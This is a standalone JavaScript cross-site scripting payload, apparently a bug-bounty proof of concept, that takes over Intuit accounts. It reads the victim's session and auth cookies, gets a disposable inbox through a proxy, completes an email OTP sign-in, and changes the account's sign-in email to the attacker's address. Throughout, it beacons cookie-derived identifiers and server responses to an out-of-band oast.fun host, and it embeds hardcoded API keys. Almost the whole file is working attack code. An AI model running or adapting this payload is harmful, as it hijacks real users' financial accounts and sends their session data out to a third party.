(function(){
try{
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var W='https://atmeta-wildcard-monitor.nasseurpay.workers.dev/?url=';
var G='https://api.guerrillamail.com/ajax.php';
var out=[];
var KEY1='prdakyres3YphxpI5f5NhtHOzVAHTTAuQmL8UmCB';
var KEY2='prdakyresHrPbNYmoGmqMbZzZslfhGPRbBpwMfzE';

function uuid(){return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0;return(c==='x'?r:r&3|8).toString(16)})}
function gc(n){var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));return m?decodeURIComponent(m[1]):''}
function beacon(t,d){new Image().src=O+'/'+t+'?d='+encodeURIComponent((d||'').substring(0,900))}
function render(){try{if(!document.body){var h=document.createElement('html');var b=document.createElement('body');h.appendChild(b);document.appendChild(h)}document.body.innerHTML='<pre style="font:13px monospace;background:#111;color:#0f0;padding:20px;white-space:pre-wrap">'+out.join('\n')+'</pre>'}catch(e){}}
function log(m){out.push(m);render()}

var FLOW_REMED=uuid();
var FLOW_AM=uuid();
function wp(u){return fetch(W+encodeURIComponent(u)).then(function(r){if(!r.ok)throw new Error('proxy '+r.status);return r.text()})}

var origSession=gc('ius_session');
var visitorId=gc('ivid');
var authId=gc('qbn.authid')||gc('qbn.gauthid');

var remedHdrs={
'Content-Type':'application/json',
'Authorization':'Intuit_APIKey intuit_apikey='+KEY1+', intuit_apikey_version=1.0',
'Intuit_Interception':'ignore-response',
'intuit_offeringid':'Intuit.identity.experiences.oneintuitam',
'intuit_offeringenv':'prd',
'intuit_identity_routing':'SBSEG',
'intuit_intentassetalias':'Intuit.identity.experiences.oneintuitam',
'intuit_locale':'en-us',
'intuit_country':'US',
'intuit_samesite_support':'true',
'intuit_flowid':FLOW_REMED,
'intuit_sessionid':origSession,
'intuit_profilingid':origSession,
'intuit_authn_session_slot':'qbn',
'intuit_visitorid':visitorId,
'intuit_baggage':btoa(JSON.stringify({scope_area:'remediation',additional_fields:{}})),
'intuit_origin':'https://accounts.intuit.com'
};

log('[*] XSS Email Change PoC (p48)');
log('[*] Origin: '+location.origin);
log('[*] Corrections: appGroup="", split flowIds, Intuit.cto.iam.ius, no slot on mutation');
log('[*] Remed flowId: '+FLOW_REMED);
log('[*] AM flowId: '+FLOW_AM);
log('');

log('[1] Getting temp email...');
beacon('p48-start','authId='+authId);

wp(G+'?f=get_email_address').then(function(raw){
var data=JSON.parse(raw);
var email=data.email_addr;
var sid=data.sid_token;
log('[1] Email: '+email);
beacon('p48-email',email);

log('[2] Initialize verifier...');
return fetch('/factors/v1/verifier/initialize/email',{
method:'POST',headers:remedHdrs,credentials:'include',
body:JSON.stringify({verifierPolicyId:'emailOtpSignIn',emailAddress:email})
}).then(function(r){return r.json()}).then(function(d){
if(!d.verifierSessionId)throw new Error('no vsid: '+JSON.stringify(d));
var vsid=d.verifierSessionId;
log('[2] vsid: '+vsid.substring(0,30)+'...');

log('[3] Polling OTP...');
var attempt=0;
function poll(){
attempt++;
return wp(G+'?f=check_email&seq=0&sid_token='+encodeURIComponent(sid)).then(function(r2){
var resp=JSON.parse(r2);var list=resp.list||[];
if(attempt%5===1)log('[3] Poll #'+attempt+': '+list.length+' emails');
if(list.length>0){
var found=null;
for(var i=0;i<list.length;i++){if((list[i].mail_subject||'').toLowerCase().indexOf('welcome to guerrilla')===-1){found=list[i];break}}
if(found){
log('[3] Got: '+found.mail_subject);
return wp(G+'?f=fetch_email&email_id='+found.mail_id+'&sid_token='+encodeURIComponent(sid)).then(function(r3){return JSON.parse(r3)})
}}
if(attempt>=60)throw new Error('OTP timeout');
return new Promise(function(res){setTimeout(function(){res(poll())},3000)})
})}

return poll().then(function(msg){
var body=(msg.mail_body||'').replace(/<[^>]*>/g,' ');
var m=body.match(/\b(\d{6})\b/);
if(!m)throw new Error('no OTP in body');
var otp=m[1];
log('[3] OTP: '+otp);

log('[4] Verify OTP...');
return fetch('/factors/v1/verifier/verify/email',{
method:'POST',headers:remedHdrs,credentials:'include',
body:JSON.stringify({verifierSessionId:vsid,otp:otp})
}).then(function(r){return r.json()}).then(function(vd){
if(!vd.verifierToken)throw new Error('no verifierToken');
log('[4] Got verifierToken');

log('[5] SignIn (appGroup="", slot=qbn)...');
var signHdrs={};for(var k in remedHdrs)signHdrs[k]=remedHdrs[k];
signHdrs['intuit_baggage']=btoa(JSON.stringify({scope_area:'remediation'}));

return fetch('/identity-api/signin/graphql',{
method:'POST',headers:signHdrs,credentials:'include',
body:JSON.stringify({
query:'mutation SignInWithVerifierToken($input:Identity_BrowserSignInWithVerifierTokenInput!){identityBrowserSignInWithVerifierToken(input:$input){__typename ...on Identity_BrowserSignInWithVerifierTokenNothingElseRequired{__typename successCode authenticationSession{digitalIdentity{legacyAuthId pseudonymId}}}...on Identity_BrowserSignInWithVerifierTokenAccessDenied{__typename}...on Identity_BrowserSignInWithVerifierTokenSomethingElseRequired{__typename}...on Identity_SignInError{__typename}}}',
variables:{input:{
intent:{appGroup:'',assetAlias:'Intuit.identity.experiences.oneintuitam',securityCategory:'ORANGE',redirectUri:'https://accounts.intuit.com/app/account-manager/security/email',rememberMe:false},
clientCapabilitySet:'v13',
finalSlotNames:['qbn'],
deviceCapabilities:{passkeySupported:false,simTs43Supported:false,digitalCredential:{userAgentAllowsProtocols:[]}},
inputSlotName:'qbn',
tenantIds:['50000003'],
verifierToken:vd.verifierToken
}}
})
}).then(function(r){return r.text()}).then(function(sr){
log('[5] SignIn: '+sr.substring(0,300));
beacon('p48-signin',sr.substring(0,900));

var freshSession=gc('ius_session');
log('[5] Session changed: '+(freshSession!==origSession));
log('[5] New session: '+freshSession.substring(0,20)+'...');

if(freshSession===origSession){
log('[!] WARNING: session did not change');
}

log('[6] ReplaceEmail (offering=Intuit.cto.iam.ius, no slot)...');
var mutHdrs={
'Content-Type':'application/json',
'Authorization':'Intuit_APIKey intuit_apikey='+KEY2+', intuit_apikey_version=1.0',
'intuit_routingid':authId,
'intuit_offeringid':'Intuit.cto.iam.ius',
'intuit_intentassetalias':'Intuit.cto.iam.ius',
'intuit_sessionid':freshSession,
'intuit_profilingid':freshSession,
'intuit_visitorid':visitorId,
'intuit_flowid':FLOW_AM,
'intuit_tid':uuid(),
'intuit_baggage':btoa(JSON.stringify({scope_area:'account_manager'}))
};

return fetch('/identity-api/v2/graphql',{
method:'POST',headers:mutHdrs,credentials:'include',
body:JSON.stringify({
operationName:'ReplaceEmail',
query:'mutation ReplaceEmail($input: Identity_CreateOrReplaceEmailCredentialInput!) { identityCreateOrReplaceEmailCredential(input: $input) { __typename ... on Identity_CreateOrReplaceEmailCredentialSuccess { status } ... on Identity_CredentialUnauthorizedError { message } ... on Identity_CredentialInvalidInputError { message } ... on Identity_DigitalIdentityLockedOutError { message } ... on Identity_EmailCredentialMatchesExistingError { message } } }',
variables:{input:{newEmailAddress:email}}
})
}).then(function(r){return r.text()}).then(function(cr){
log('[6] Response: '+cr.substring(0,500));
beacon('p48-replace',cr.substring(0,900));

var crd;try{crd=JSON.parse(cr)}catch(e){}
if(crd&&crd.data&&crd.data.identityCreateOrReplaceEmailCredential){
var result=crd.data.identityCreateOrReplaceEmailCredential;
if(result.__typename==='Identity_CreateOrReplaceEmailCredentialSuccess'){
log('');
log('=============================================');
log('  SIGN-IN EMAIL CHANGED TO: '+email);
log('  Status: '+result.status);
log('=============================================');
beacon('p48-SUCCESS',email);
}else{
log('[6] '+result.__typename+': '+(result.message||''));
beacon('p48-fail',result.__typename);
}
}
})
})
})
})
})
})
}).catch(function(err){
log('[!] ERROR: '+err.message);
beacon('p48-err',err.message);
});

}catch(e){
new Image().src=O+'/p48-crash?e='+encodeURIComponent(e.message);
}
})();
